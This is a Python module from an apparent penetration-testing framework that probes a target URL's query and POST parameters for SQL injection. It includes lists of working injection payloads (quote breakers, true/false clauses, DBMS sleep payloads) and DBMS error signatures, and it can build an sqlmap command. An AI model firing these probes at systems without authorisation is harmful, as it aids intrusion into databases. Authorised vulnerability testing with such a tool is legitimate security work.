"""SQL injection tester (error-based, boolean-based, time-based).

``web.sqli`` fuzzes the query-string and/or POST-body parameters of a single
target request with deterministic, rule-based probes and reports any
parameter that shows a clear sign of SQL injection:

* **error-based**  -- quote/paren "breaker" payloads are appended to the
  parameter's original value and the response body is scanned for a DBMS
  error signature (MySQL/MariaDB, PostgreSQL, MSSQL, Oracle, SQLite) that was
  *not* present in an unmodified baseline response.
* **boolean-based** -- an always-TRUE payload (``AND 1=1``) and an
  always-FALSE payload (``AND 1=2``) are compared against a baseline request
  using response status + a body-similarity ratio; a TRUE response that looks
  like the baseline while the FALSE response looks materially different is a
  strong blind-SQLi signal.
* **time-based** -- a DBMS-specific sleep primitive (``SLEEP``, ``pg_sleep``,
  ``WAITFOR DELAY``, ``dbms_pipe.receive_message``) is injected and the
  response time is compared against *two* unmodified control requests (one
  before, one after) so a single slow response cannot be mistaken for a hit.

Design invariants honoured here:

* NO AI/LLM usage anywhere -- every decision is a deterministic regex/ratio
  rule.
* Pure standard library (``re``, ``difflib``, ``urllib.parse``, ``uuid``).
  No third-party imports at all.
* Imports cleanly on Windows and Linux; no OS-specific call at import time.
* Offline: no downloads, no external services.
* Bounded and safe: capped parameter count, capped payloads per technique,
  a hard overall request budget, GET-friendly by default (state-changing
  POST bodies are only ever sent to the *same* endpoint/method the operator
  configured -- nothing destructive is invented). For AUTHORIZED testing of
  targets you are entitled to assess only.
"""
from __future__ import annotations

import difflib
import re
import urllib.parse
import uuid
from typing import Dict, List, Optional, Set, Tuple

from redkit.core.module import Module, Option, Result
from redkit.core.registry import register
from redkit.core.http import WEB_COMMON_OPTIONS, Response, client_from_opts

# --------------------------------------------------------------------------- #
# tuning constants (all conservative / bounded)
# --------------------------------------------------------------------------- #
MAX_PARAMS = 15                 # cap on distinct parameters tested per run
MAX_TOTAL_REQUESTS = 400        # hard cap on requests across the whole run
COMPARE_LIMIT = 4000            # chars of body compared for boolean-based diffing
SNIPPET_PAD = 40                # chars of context kept either side of a regex hit
MIN_DELAY = 1
MAX_DELAY = 15                  # bound how long a time-based probe may sleep for

# --------------------------------------------------------------------------- #
# deterministic DBMS error-message signatures
# --------------------------------------------------------------------------- #
_DBMS_ERRORS: List[Tuple[str, "re.Pattern[str]"]] = [
    ("MySQL/MariaDB", re.compile(
        r"SQL syntax.*?MySQL|Warning.*?\Wmysqli?_|MySQLSyntaxErrorException|"
        r"valid MySQL result|check the manual that corresponds to your "
        r"(?:MySQL|MariaDB) server|Unknown column '.*?' in|"
        r"You have an error in your SQL syntax|mysql_fetch_array\(\)",
        re.I,
    )),
    ("PostgreSQL", re.compile(
        r"PostgreSQL.*?ERROR|Warning.*?\Wpg_|valid PostgreSQL result|Npgsql\.|"
        r"PG::SyntaxError|ERROR:\s+syntax error at or near|"
        r"unterminated quoted string at or near",
        re.I,
    )),
    ("MSSQL", re.compile(
        r"Driver.*? SQL[ \-_]*Server|OLE DB.*?SQL Server|"
        r"(?:Microsoft SQL Server|SQL Server).{0,40}(?:Error|Driver)|"
        r"Unclosed quotation mark after the character string|"
        r"Microsoft SQL Native Client error|"
        r"System\.Data\.SqlClient\.SqlException|Incorrect syntax near",
        re.I,
    )),
    ("Oracle", re.compile(
        r"\bORA-\d{4,5}\b|Oracle error|Oracle.*?Driver|"
        r"quoted string not properly terminated",
        re.I,
    )),
    ("SQLite", re.compile(
        r"SQLite/JDBCDriver|SQLite\.Exception|"
        r"System\.Data\.SQLite\.SQLiteException|\[SQLITE_ERROR\]|"
        r"sqlite3\.OperationalError|near \".*?\": syntax error",
        re.I,
    )),
]

# quote/paren "breaker" payloads for error-based testing (bounded list)
_ERROR_PAYLOADS: List[str] = ["'", "\"", "')", "\")", "'))", "\"))"]

# (TRUE suffix, FALSE suffix) pairs for boolean-based testing (bounded list)
_BOOLEAN_PAIRS: List[Tuple[str, str]] = [
    (" AND 1=1", " AND 1=2"),
    (" OR 1=1", " OR 1=2"),
    ("' AND '1'='1", "' AND '1'='2"),
    ("' OR '1'='1", "' OR '1'='2"),
    ("\" AND \"1\"=\"1", "\" AND \"1\"=\"2"),
]

# (dbms label, payload template with a {d} delay placeholder) for time-based
# testing (bounded list)
_TIME_PAYLOADS: List[Tuple[str, str]] = [
    ("MySQL/MariaDB", "' AND SLEEP({d})-- -"),
    ("MySQL/MariaDB", " AND SLEEP({d})-- -"),
    ("PostgreSQL", "' AND pg_sleep({d})-- -"),
    ("PostgreSQL", " AND pg_sleep({d})-- -"),
    ("MSSQL", "'; WAITFOR DELAY '0:0:{d}'--"),
    ("Oracle", "' AND DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),{d})-- -"),
]


# --------------------------------------------------------------------------- #
# small helpers (pure, deterministic)
# --------------------------------------------------------------------------- #
def _normalize_url(raw: str) -> str:
    raw = (raw or "").strip()
    if not raw:
        return ""
    if "://" not in raw:
        raw = "http://" + raw
    return raw


def _match_errors(text: str) -> Set[str]:
    if not text:
        return set()
    sample = text[:20000]
    return {name for name, pattern in _DBMS_ERRORS if pattern.search(sample)}


def _snippet(text: str, dbms: str) -> str:
    sample = text[:20000]
    for name, pattern in _DBMS_ERRORS:
        if name != dbms:
            continue
        match = pattern.search(sample)
        if match:
            start = max(0, match.start() - SNIPPET_PAD)
            end = min(len(sample), match.end() + SNIPPET_PAD)
            return sample[start:end].strip().replace("\n", " ")
    return ""


def _collect_targets(
    query_params: Dict[str, str],
    body_params: Dict[str, str],
    param_opt: str,
    method: str,
) -> List[Tuple[str, str, str]]:
    """Build the ``(source, name, original_value)`` list to test.

    ``param_opt`` (comma-separated) restricts testing to those names. Names
    the operator asked for that are not present in the current request are
    still added (with an empty original value) targeting whichever location
    matches the configured method, so a known-but-absent hidden parameter can
    be probed on purpose.
    """
    allowed = [p.strip() for p in str(param_opt or "").split(",") if p.strip()]
    targets: List[Tuple[str, str, str]] = []
    seen: Set[Tuple[str, str]] = set()

    def add(source: str, name: str, value: str) -> None:
        key = (source, name)
        if key not in seen:
            seen.add(key)
            targets.append((source, name, value))

    for name, value in query_params.items():
        if not allowed or name in allowed:
            add("query", name, value)
    for name, value in body_params.items():
        if not allowed or name in allowed:
            add("body", name, value)

    if allowed:
        covered = {name for _, name, _ in targets}
        for name in allowed:
            if name not in covered:
                add("body" if method == "POST" else "query", name, "")

    return targets


class _Budget:
    """Mutable request budget shared across every probe in a single run()."""

    __slots__ = ("remaining", "_warned")

    def __init__(self, limit: int):
        self.remaining = limit
        self._warned = False

    def take(self, console) -> bool:
        if self.remaining <= 0:
            if not self._warned:
                console.warn(f"request budget ({MAX_TOTAL_REQUESTS}) exhausted; stopping further sqli probes")
                self._warned = True
            return False
        self.remaining -= 1
        return True


def _send(
    client,
    method: str,
    base_url: str,
    query: Dict[str, str],
    body: Dict[str, str],
    source: str,
    name: str,
    test_value: str,
    budget: "_Budget",
    console,
) -> Optional[Response]:
    """Send one probe request with ``name``'s value replaced by ``test_value``.

    A fresh random cache-busting query parameter is added to every request so
    an intercepting cache/CDN cannot return a stale, structurally-identical
    response for two probes that must be told apart (e.g. TRUE vs FALSE).
    """
    if not budget.take(console):
        return None
    q = dict(query)
    b = dict(body)
    if source == "query":
        q[name] = test_value
    else:
        b[name] = test_value
    q.setdefault("_redkit_cb", uuid.uuid4().hex[:10])
    try:
        return client.request(method, base_url, params=q or None, data=b or None)
    except Exception as exc:  # noqa: BLE001 - a single probe must never abort the scan
        console.debug(f"probe error for {name}: {exc}")
        return None


# --------------------------------------------------------------------------- #
# per-technique test functions
# --------------------------------------------------------------------------- #
def _test_error(
    client, method, base_url, query, body, source, name, value, budget, console
) -> Optional[Dict[str, str]]:
    baseline = _send(client, method, base_url, query, body, source, name, value, budget, console)
    baseline_hits = _match_errors(baseline.text) if baseline and baseline.status else set()

    for payload in _ERROR_PAYLOADS:
        resp = _send(client, method, base_url, query, body, source, name, f"{value}{payload}", budget, console)
        if resp is None or resp.status == 0:
            continue
        hits = _match_errors(resp.text) - baseline_hits
        if hits:
            dbms = sorted(hits)[0]
            return {"payload": payload, "dbms": dbms, "evidence": _snippet(resp.text, dbms)}
    return None


def _test_boolean(
    client, method, base_url, query, body, source, name, value, budget, console
) -> Optional[Dict[str, str]]:
    baseline = _send(client, method, base_url, query, body, source, name, value, budget, console)
    if baseline is None or baseline.status == 0:
        return None
    base_text = baseline.text[:COMPARE_LIMIT]
    base_status = baseline.status

    for true_suffix, false_suffix in _BOOLEAN_PAIRS:
        true_resp = _send(client, method, base_url, query, body, source, name, f"{value}{true_suffix}", budget, console)
        false_resp = _send(client, method, base_url, query, body, source, name, f"{value}{false_suffix}", budget, console)
        if true_resp is None or false_resp is None:
            continue
        if true_resp.status == 0 or false_resp.status == 0:
            continue

        true_text = true_resp.text[:COMPARE_LIMIT]
        false_text = false_resp.text[:COMPARE_LIMIT]
        sim_true = difflib.SequenceMatcher(None, base_text, true_text).ratio()
        sim_false = difflib.SequenceMatcher(None, base_text, false_text).ratio()

        status_signal = true_resp.status == base_status and false_resp.status != base_status
        body_signal = sim_true >= 0.98 and sim_false <= 0.90 and (sim_true - sim_false) >= 0.08

        if status_signal or body_signal:
            return {
                "payload": f"{value}{true_suffix}  (TRUE)  /  {value}{false_suffix}  (FALSE)",
                "evidence": (
                    f"TRUE status={true_resp.status} len={true_resp.length}; "
                    f"FALSE status={false_resp.status} len={false_resp.length}; "
                    f"baseline status={base_status} len={baseline.length}; "
                    f"similarity(true,baseline)={sim_true:.2f} similarity(false,baseline)={sim_false:.2f}"
                ),
            }
    return None


def _test_time(
    client, method, base_url, query, body, source, name, value, delay, budget, console
) -> Optional[Dict[str, str]]:
    control = _send(client, method, base_url, query, body, source, name, value, budget, console)
    if control is None or control.status == 0:
        return None
    threshold = delay * 0.8

    for dbms, template in _TIME_PAYLOADS:
        payload = template.format(d=delay)
        injected = _send(client, method, base_url, query, body, source, name, f"{value}{payload}", budget, console)
        if injected is None or injected.status == 0:
            continue
        if injected.elapsed - control.elapsed < threshold:
            continue

        # confirm with a second, unmodified control so ordinary network
        # jitter (or a target that's simply slow right now) is not mistaken
        # for a real jump.
        confirm = _send(client, method, base_url, query, body, source, name, value, budget, console)
        if confirm is None or confirm.status == 0:
            continue
        if injected.elapsed - confirm.elapsed >= threshold:
            return {
                "payload": payload,
                "dbms": dbms,
                "evidence": (
                    f"baseline={control.elapsed:.2f}s injected={injected.elapsed:.2f}s "
                    f"confirm_baseline={confirm.elapsed:.2f}s (target delay={delay}s)"
                ),
            }
    return None


def _build_sqlmap_cmd(url: str, method: str, body_params: Dict[str, str], targets: List[Tuple[str, str, str]], opts: Dict[str, object]) -> str:
    """Render a ready-to-run sqlmap command line. Never executed automatically."""
    import shlex

    argv = ["sqlmap", "-u", shlex.quote(url)]
    if method == "POST" and body_params:
        argv += ["--data", shlex.quote(urllib.parse.urlencode(body_params))]
    names = ",".join(sorted({name for _, name, _ in targets}))
    if names:
        argv += ["-p", shlex.quote(names)]
    cookie = str(opts.get("cookie", "") or "")
    if cookie:
        argv += ["--cookie", shlex.quote(cookie)]
    proxy = str(opts.get("proxy", "") or "")
    if proxy:
        argv += ["--proxy", shlex.quote(proxy)]
    header = str(opts.get("header", "") or "")
    for chunk in header.split("||"):
        chunk = chunk.strip()
        if chunk:
            argv += ["--header", shlex.quote(chunk)]
    argv += ["--batch", "--level=1", "--risk=1"]
    return " ".join(a for a in argv if a)


def _write_artifact(ctx, host: str, data: Dict[str, object]) -> Optional[str]:
    import json

    try:
        path = ctx.artifact_path(f"sqli_{host}.json".replace(":", "_"))
        path.write_text(json.dumps(data, indent=2, ensure_ascii=False), encoding="utf-8")
        return str(path)
    except OSError:
        return None


# --------------------------------------------------------------------------- #
# module
# --------------------------------------------------------------------------- #
@register
class SqlInjection(Module):
    """Deterministic error/boolean/time-based SQL injection tester."""

    name = "web.sqli"
    description = "SQL injection tester (error, boolean, and time based)"
    phase = "web"
    options = [
        Option("url", help="target URL, including any query string to test", required=True),
        Option("param", default="", help="comma list of parameter name(s) to test (default: every query/body param)"),
        Option("method", default="GET", choices=["GET", "POST"], help="HTTP method used for every probe"),
        Option("data", default="", help="POST body as k=v&k=v (parsed for additional body parameters)"),
        Option("technique", default="all", choices=["all", "error", "boolean", "time"], help="which technique(s) to run"),
        Option("delay", default=5, help="seconds for the time-based SLEEP/WAITFOR payload (1-15)"),
        Option("use_sqlmap", default=False, help="if sqlmap is on PATH, print a ready sqlmap command (never auto-run)"),
    ] + WEB_COMMON_OPTIONS
    references = [
        "https://owasp.org/www-community/attacks/SQL_Injection",
        "https://portswigger.net/web-security/sql-injection",
        "https://portswigger.net/web-security/sql-injection/blind",
        "https://github.com/sqlmapproject/sqlmap",
    ]

    def run(self, opts: Dict[str, object], ctx) -> Result:
        console = ctx.console

        raw_url = str(opts["url"]).strip()
        url = _normalize_url(raw_url)
        parts = urllib.parse.urlsplit(url)
        if not parts.hostname:
            return Result(ok=False, summary=f"invalid url: {raw_url!r} (expected http(s)://host/path)")

        host = parts.hostname
        base_url = urllib.parse.urlunsplit((parts.scheme, parts.netloc, parts.path or "/", "", ""))
        query_params = dict(urllib.parse.parse_qsl(parts.query, keep_blank_values=True))
        body_params = dict(urllib.parse.parse_qsl(str(opts.get("data") or ""), keep_blank_values=True))

        method = str(opts["method"]).upper()
        technique = str(opts["technique"]).lower()
        delay = max(MIN_DELAY, min(int(opts["delay"]), MAX_DELAY))

        targets = _collect_targets(query_params, body_params, str(opts.get("param") or ""), method)
        if not targets:
            console.warn(
                "no query/body parameters found to test "
                "(pass a URL with a query string, -o data=k=v, or -o param=name)"
            )
            return Result(ok=True, summary=f"{url}: no parameters found to test", data={"url": url, "vulnerable": []})

        if len(targets) > MAX_PARAMS:
            console.warn(f"{len(targets)} parameter(s) found; capping to the first {MAX_PARAMS}")
            targets = targets[:MAX_PARAMS]

        ctx.engagement.add_host(host)
        console.info(
            f"sqli test {url} method={method} technique={technique} "
            f"param(s)={', '.join(f'{s}:{n}' for s, n, _ in targets)}"
        )

        client = client_from_opts(opts)
        # time-based probes need enough headroom for the sleep itself on top
        # of normal network latency, independent of the operator's timeout.
        time_opts = dict(opts)
        time_opts["timeout"] = max(float(opts.get("timeout", 10) or 10), delay + 5)
        time_client = client_from_opts(time_opts)

        budget = _Budget(MAX_TOTAL_REQUESTS)
        techniques = ["error", "boolean", "time"] if technique == "all" else [technique]

        vulnerable: List[Dict[str, object]] = []
        tested: List[Dict[str, str]] = []

        for source, name, value in targets:
            tested.append({"source": source, "name": name})
            for tech in techniques:
                if tech == "error":
                    hit = _test_error(client, method, base_url, query_params, body_params, source, name, value, budget, console)
                elif tech == "boolean":
                    hit = _test_boolean(client, method, base_url, query_params, body_params, source, name, value, budget, console)
                else:  # time
                    hit = _test_time(time_client, method, base_url, query_params, body_params, source, name, value, delay, budget, console)

                if hit:
                    finding = {
                        "param": name,
                        "source": source,
                        "technique": tech,
                        "payload": hit["payload"],
                        "dbms": hit.get("dbms"),
                        "evidence": hit.get("evidence") or hit["payload"],
                    }
                    vulnerable.append(finding)
                    console.good(f"SQL injection ({tech}) in {source} param '{name}': {hit['payload']!r}")
                    ctx.engagement.add_finding(
                        title=f"SQL injection ({tech}-based) in parameter '{name}'",
                        severity="critical",
                        host=host,
                        description=(
                            f"Parameter '{name}' ({source}) at {url} appears vulnerable to "
                            f"{tech}-based SQL injection"
                            + (f" ({hit['dbms']})" if hit.get("dbms") else "")
                            + f". Payload: {hit['payload']}"
                        ),
                        evidence=str(finding["evidence"]),
                    )

                if budget.remaining <= 0:
                    break
            if budget.remaining <= 0:
                break

        sqlmap_cmd: Optional[str] = None
        if bool(opts.get("use_sqlmap")):
            if ctx.runner.have("sqlmap"):
                sqlmap_cmd = _build_sqlmap_cmd(url, method, body_params, targets, opts)
                console.info("sqlmap command ready (NOT executed automatically):")
                console.raw(f"  {sqlmap_cmd}")
            else:
                console.warn("use_sqlmap requested but 'sqlmap' was not found on PATH; skipping")

        data: Dict[str, object] = {
            "url": url,
            "method": method,
            "technique": technique,
            "tested_params": tested,
            "vulnerable": vulnerable,
        }
        if sqlmap_cmd:
            data["sqlmap_command"] = sqlmap_cmd

        artifact = _write_artifact(ctx, host, data)

        if vulnerable:
            summary = f"{url}: {len(vulnerable)} SQL injection finding(s) across {len(tested)} tested param(s)"
        else:
            summary = f"{url}: tested {len(tested)} param(s), no SQL injection found"
        ctx.engagement.add_note(f"web.sqli: {summary}")

        return Result(ok=True, summary=summary, data=data, artifacts=[artifact] if artifact else [])
